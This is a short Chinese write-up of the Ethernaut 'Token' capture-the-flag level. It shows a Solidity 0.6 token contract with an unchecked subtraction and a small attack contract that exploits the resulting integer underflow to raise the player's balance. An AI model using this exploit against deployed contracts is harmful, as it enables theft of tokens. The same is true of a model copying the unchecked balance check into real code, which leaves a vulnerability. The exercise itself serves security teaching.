---
title: ethernaut NO.5
tags： TeXt
---



首先来看合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

```

**合约中本来有20个代币，要求获得1个或者更多**

<span style="color: red;">关键点</span>: 这个合约的solidity版本是0.6的，该版本没有设置整型溢出的检测，所以我们可以利用整型溢出来完成这道题；

以下是攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to ,uint256 value) external returns (bool);
}
contract Hcak{
    constructor (address _target){
        IToken(_target).transfer(msg.sender,1);
    }
}
```

需要做的是将该合约部署在需要攻击的合约地址中，然后调用IToken就可以查询合约的代币数量为21；

